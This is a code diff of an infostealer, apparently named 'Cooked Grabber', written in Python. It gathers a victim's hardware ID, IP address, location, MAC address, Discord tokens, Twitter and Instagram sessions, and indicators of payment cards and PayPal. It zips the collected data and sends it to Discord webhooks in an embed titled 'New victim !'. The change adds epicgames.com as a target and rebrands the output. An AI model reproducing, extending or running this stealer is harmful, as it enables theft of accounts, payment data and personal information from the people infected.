@@ -25,7 +25,7 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from cpuinfo import get_cpu_info
 from multiprocessing import freeze_support
 
-website = ['discord.com', 'twitter.com', 'instagram.com']
+website = ['discord.com', 'twitter.com', 'instagram.com', 'epicgames.com']
 
 def get_hwid():
     p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
@@ -264,18 +264,14 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 zip.write(name_f)
                 os.remove(name_f)
     for URL in DISCORD_WEBHOOK_URLs:
-        webhook = DiscordWebhook(url=URL, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
-        embed = DiscordEmbed(title='Cooked Grabber', color='00FF00')
+        webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://c.tenor.com/h3fCM442dCcAAAAC/discord-logo.gif")
+        embed = DiscordEmbed(title='New victim !', color='00FF00')
         embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
         embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get('https://restcountries.com/v3/name/morocco').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
         embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
         embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
         card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
         embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
-        embed.set_author(
-            name="H4X0R-TEAM",
-            url="https://github.com/h4x0r-project"
-        )
         embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
         embed.set_timestamp()
         with open("data.zip", 'rb') as f:
